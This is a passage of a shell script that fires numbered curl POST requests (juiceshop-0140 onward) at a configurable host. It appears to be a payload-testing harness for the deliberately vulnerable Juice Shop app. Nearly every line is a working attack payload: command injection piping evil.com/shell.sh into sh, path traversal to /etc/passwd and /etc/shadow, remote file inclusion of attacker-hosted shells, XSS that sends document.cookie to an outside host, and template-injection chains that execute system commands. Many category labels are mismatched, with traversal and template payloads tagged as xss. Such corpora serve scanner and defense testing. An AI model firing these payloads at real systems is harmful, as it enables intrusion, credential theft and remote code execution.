  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "; curl http://evil.com/shell.sh | sh"}'
do_curl 'juiceshop-0140' 'cmdi' '$\{@print(md5(1))\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{@print(md5(1))\\}"}'
do_curl 'juiceshop-0141' 'xss' '%26%26%20whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%26%26%20whoami"}'
do_curl 'juiceshop-0142' 'cmdi' '%3B%20id' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3B%20id"}'
do_curl 'juiceshop-0143' 'cmdi' '%60uname%20-a%60' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%60uname%20-a%60"}'
do_curl 'juiceshop-0144' 'xss' '|c%75rl http://evil.com' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "|c%75rl http://evil.com"}'
do_curl 'juiceshop-0145' 'xss' '$IFS$9$IFS$9whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$IFS$9$IFS$9whoami"}'
do_curl 'juiceshop-0146' 'xss' ';& whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": ";& whoami"}'
do_curl 'juiceshop-0147' 'xss' '../../../../../../etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../../../../etc/passwd"}'
do_curl 'juiceshop-0148' 'xss' '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"}'
do_curl 'juiceshop-0149' 'xss' '....//....//....//etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "....//....//....//etc/passwd"}'
do_curl 'juiceshop-0150' 'xss' '%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}'
do_curl 'juiceshop-0151' 'xss' '%252e%252e%252fetc%252fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%252e%252e%252fetc%252fpasswd"}'
do_curl 'juiceshop-0152' 'xss' 'php://filter/convert.base64-encode/resource=index.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "php://filter/convert.base64-encode/resource=index.php"}'
do_curl 'juiceshop-0153' 'lfi' 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="}'
do_curl 'juiceshop-0154' 'xss' '../../../../etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../../etc/passwd"}'
do_curl 'juiceshop-0155' 'xss' '../../../boot.ini' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../boot.ini"}'
do_curl 'juiceshop-0156' 'xss' '../../../../../../windows/win.ini' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../../../../windows/win.ini"}'
do_curl 'juiceshop-0157' 'xss' '../.../.../.../.../.../.../etc/shadow' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../.../.../.../.../.../.../etc/shadow"}'
do_curl 'juiceshop-0158' 'lfi' 'expect://id' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "expect://id"}'
do_curl 'juiceshop-0159' 'xss' '../../../../../../etc/passwd%00' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../../../../etc/passwd%00"}'
do_curl 'juiceshop-0160' 'xss' '..%2f..%2f..%2f..%2fetc%2fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%2f..%2f..%2f..%2fetc%2fpasswd"}'
do_curl 'juiceshop-0161' 'xss' '..%252f..%252f..%252fetc%252fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%252f..%252f..%252fetc%252fpasswd"}'
do_curl 'juiceshop-0162' 'xss' '..//..//..//etc//passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..//..//..//etc//passwd"}'
do_curl 'juiceshop-0163' 'lfi' '..%c0%af..%c0%afetc%c0%afpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%c0%af..%c0%afetc%c0%afpasswd"}'
do_curl 'juiceshop-0164' 'xss' '....//....//etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "....//....//etc/passwd"}'
do_curl 'juiceshop-0165' 'xss' '..%c0%af..%c0%afetc%2fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "..%c0%af..%c0%afetc%2fpasswd"}'
do_curl 'juiceshop-0166' 'xss' '../../../etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "../../../etc/passwd"}'
do_curl 'juiceshop-0167' 'xss' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}'
do_curl 'juiceshop-0168' 'rfi' 'http://evil.com/shell.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://evil.com/shell.txt"}'
do_curl 'juiceshop-0169' 'rfi' '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"}'
do_curl 'juiceshop-0170' 'rfi' 'https://evil.com/backdoor.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "https://evil.com/backdoor.php"}'
do_curl 'juiceshop-0171' 'rfi' '%252f%252fmalicious.com%252fshell.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%252f%252fmalicious.com%252fshell.txt"}'
do_curl 'juiceshop-0172' 'rfi' '%5c%5cattacker.com%5cbackdoor.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%5c%5cattacker.com%5cbackdoor.txt"}'
do_curl 'juiceshop-0173' 'rfi' 'https://attacker.site/malware.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "https://attacker.site/malware.php"}'
do_curl 'juiceshop-0174' 'rfi' 'http://evil.com/shell.txt?' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://evil.com/shell.txt?"}'
do_curl 'juiceshop-0175' 'xss' 'http://127.0.0.1/evil.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://127.0.0.1/evil.txt"}'
do_curl 'juiceshop-0176' 'xss' 'http://[::]/evil.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://[::]/evil.php"}'
do_curl 'juiceshop-0177' 'rfi' 'http%3A%2F%2Fevil.com%2Fshell.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http%3A%2F%2Fevil.com%2Fshell.txt"}'
do_curl 'juiceshop-0178' 'xss' 'http%3A%2F%2F127.0.0.1%2Fevil.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http%3A%2F%2F127.0.0.1%2Fevil.txt"}'
do_curl 'juiceshop-0179' 'rfi' 'http://evil.com%00/shell.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://evil.com%00/shell.php"}'
do_curl 'juiceshop-0180' 'rfi' 'http://evil.com//shell.txt' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://evil.com//shell.txt"}'
do_curl 'juiceshop-0181' 'rfi' 'http://ev%69l.com/shell.php' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "http://ev%69l.com/shell.php"}'
do_curl 'juiceshop-0182' 'xss' 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"}'
do_curl 'juiceshop-0183' 'xss' 'new%20Function('\''alert(1)'\'')()' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "new%20Function('\''alert(1)'\'')()"}'
do_curl 'juiceshop-0184' 'xss' 'setTimeout('\''%61lert(1)'\'',1000)' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "setTimeout('\''%61lert(1)'\'',1000)"}'
do_curl 'juiceshop-0185' 'xss' 'document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')"}'
do_curl 'juiceshop-0186' 'xss' '<img src="x" onerror="alert(1)">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<img src=\"x\" onerror=\"alert(1)\">"}'
do_curl 'juiceshop-0187' 'xss' '<a href="javascript:alert(1)">XSS</a>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<a href=\"javascript:alert(1)\">XSS</a>"}'
do_curl 'juiceshop-0188' 'xss' '<body onload="alert(1)">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<body onload=\"alert(1)\">"}'
do_curl 'juiceshop-0189' 'xss' '<script>document.write('\''<img src="http://example.com/xss.png?c='\'' + document.cookie + '\''">'\'')</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>document.write('\''<img src=\"http://example.com/xss.png?c='\'' + document.cookie + '\''\">'\'')</script>"}'
do_curl 'juiceshop-0190' 'xss' '<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>"}'
do_curl 'juiceshop-0191' 'xss' '<img src="x" onerror="eval(atob('\''YWxlcnQoMSk='\''))">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<img src=\"x\" onerror=\"eval(atob('\''YWxlcnQoMSk='\''))\">"}'
do_curl 'juiceshop-0192' 'xss' '<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var a=document.createElement(\"a\");a.href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\";a.click();</script>"}'
do_curl 'juiceshop-0193' 'xss' '<script>var s=document.createElement("script");s.src="http://example.com/xss.js";document.body.appendChild(s);</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var s=document.createElement(\"script\");s.src=\"http://example.com/xss.js\";document.body.appendChild(s);</script>"}'
do_curl 'juiceshop-0194' 'xss' '<script>var i=new Image();i.src="http://example.com/xss.png?c="+document.cookie;document.body.appendChild(i);</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var i=new Image();i.src=\"http://example.com/xss.png?c=\"+document.cookie;document.body.appendChild(i);</script>"}'
do_curl 'juiceshop-0195' 'xss' '<script>fetch("http://example.com/xss.php?c="+document.cookie);</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>fetch(\"http://example.com/xss.php?c=\"+document.cookie);</script>"}'
do_curl 'juiceshop-0196' 'xss' '<script>var x=new XMLHttpRequest();x.open("GET","http://example.com/xss.php?c="+document.cookie,true);x.send();</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var x=new XMLHttpRequest();x.open(\"GET\",\"http://example.com/xss.php?c=\"+document.cookie,true);x.send();</script>"}'
do_curl 'juiceshop-0197' 'xss' '<script>var s=document.createElement("iframe");s.src="http://example.com/xss.php?c="+document.cookie;document.body.appendChild(s);</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var s=document.createElement(\"iframe\");s.src=\"http://example.com/xss.php?c=\"+document.cookie;document.body.appendChild(s);</script>"}'
do_curl 'juiceshop-0198' 'xss' '<script>var l=document.createElement("link");l.rel="stylesheet";l.href="http://example.com/xss.css";document.head.appendChild(l);</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>var l=document.createElement(\"link\");l.rel=\"stylesheet\";l.href=\"http://example.com/xss.css\";document.head.appendChild(l);</script>"}'
do_curl 'juiceshop-0199' 'xss' '&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;"}'
do_curl 'juiceshop-0200' 'xss' '&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;"}'
do_curl 'juiceshop-0201' 'xss' '&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;"}'
do_curl 'juiceshop-0202' 'xss' '&#x3C;body onload=alert('\''Payload4'\'')&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;body onload=alert('\''Payload4'\'')&#x3E;"}'
do_curl 'juiceshop-0203' 'xss' '&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;"}'
do_curl 'juiceshop-0204' 'xss' '&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;"}'
do_curl 'juiceshop-0205' 'xss' '&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;"}'
do_curl 'juiceshop-0206' 'xss' '&#x3C;style&#x3E;*\{x:expression(alert('\''Payload8'\''))\}&#x3C;/style&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;style&#x3E;*\\{x:expression(alert('\''Payload8'\''))\\}&#x3C;/style&#x3E;"}'
do_curl 'juiceshop-0207' 'xss' '&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;"}'
do_curl 'juiceshop-0208' 'xss' '&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;"}'
do_curl 'juiceshop-0209' 'xss' '&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;"}'
do_curl 'juiceshop-0210' 'xss' '&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;"}'
do_curl 'juiceshop-0211' 'xss' '&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;"}'
do_curl 'juiceshop-0212' 'xss' '&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;"}'
do_curl 'juiceshop-0213' 'xss' '&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;"}'
do_curl 'juiceshop-0214' 'xss' '&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;"}'
do_curl 'juiceshop-0215' 'xss' '&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;"}'
do_curl 'juiceshop-0216' 'ssti' '<%= 7 * 7 %>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<%= 7 * 7 %>"}'
do_curl 'juiceshop-0217' 'ssti' '$\{7*7\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{7*7\\}"}'
do_curl 'juiceshop-0218' 'xss' '$\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\\}"}'
do_curl 'juiceshop-0219' 'ssti' '%7B%7B7*7%7D%7D' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%7B%7B7*7%7D%7D"}'
do_curl 'juiceshop-0220' 'ssti' '%24%7B7*7%7D' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%24%7B7*7%7D"}'
do_curl 'juiceshop-0221' 'ssti' '$\{3*3\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{3*3\\}"}'
do_curl 'juiceshop-0222' 'ssti' '$\{\{7*7\}\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{\\{7*7\\}\\}"}'
do_curl 'juiceshop-0223' 'ssti' '@(1+2)' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "@(1+2)"}'
do_curl 'juiceshop-0224' 'xss' '<%= File.open('\''/etc/passwd'\'').read %>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<%= File.open('\''/etc/passwd'\'').read %>"}'
do_curl 'juiceshop-0225' 'ssti' '<#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>$\\{ ex(\"id\")\\}"}'
do_curl 'juiceshop-0226' 'ssti' '[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\{ ex('\''id'\'')\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\\{ ex('\''id'\'')\\}"}'
do_curl 'juiceshop-0227' 'ssti' '$\{"freemarker.template.utility.Execute"?new()("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{\"freemarker.template.utility.Execute\"?new()(\"id\")\\}"}'
do_curl 'juiceshop-0228' 'xss' '$\{T(java.lang.System).getenv()\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{T(java.lang.System).getenv()\\}"}'
do_curl 'juiceshop-0229' 'xss' '$\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\\}"}'
do_curl 'juiceshop-0230' 'xss' '$\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\}$\{self.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\\}$\\{self.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0231' 'xss' '$\{self.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0232' 'xss' '$\{self.template.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0233' 'xss' '$\{self.module.cache.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.cache.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0234' 'xss' '$\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\\}"}'
do_curl 'juiceshop-0235' 'xss' '$\{self.template.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0236' 'xss' '$\{self.module.filters.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.filters.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0237' 'xss' '$\{self.module.runtime.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0238' 'xss' '$\{self.module.runtime.exceptions.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.exceptions.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0239' 'xss' '$\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\\}"}'
do_curl 'juiceshop-0240' 'xss' '$\{self.module.cache.util.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.cache.util.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0241' 'xss' '$\{self.module.runtime.util.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.util.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0242' 'xss' '$\{self.template._mmarker.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0243' 'xss' '$\{self.template.module.cache.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.cache.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0244' 'xss' '$\{self.module.cache.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.cache.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0245' 'xss' '$\{self.template._mmarker.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template._mmarker.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0246' 'xss' '$\{self.attr._NSAttr__parent.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0247' 'xss' '$\{self.template.module.filters.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.filters.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0248' 'xss' '$\{self.template.module.runtime.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0249' 'xss' '$\{self.module.filters.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.filters.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0250' 'xss' '$\{self.module.runtime.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0251' 'xss' '$\{self.template.module.runtime.exceptions.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.runtime.exceptions.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0252' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0253' 'xss' '$\{self.context._with_template.module.cache.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.cache.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0254' 'xss' '$\{self.module.runtime.exceptions.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.runtime.exceptions.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0255' 'xss' '$\{self.template.module.cache.util.compat.inspect.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.template.module.cache.util.compat.inspect.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0256' 'xss' '$\{self.context._with_template.module.runtime.util.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.context._with_template.module.runtime.util.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0257' 'xss' '$\{self.module.cache.util.compat.inspect.linecache.os.system("id")\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{self.module.cache.util.compat.inspect.linecache.os.system(\"id\")\\}"}'
do_curl 'juiceshop-0258' 'xss' '$\{self.template.module.runtime.util.compat.inspect.os.system("id")\}' \
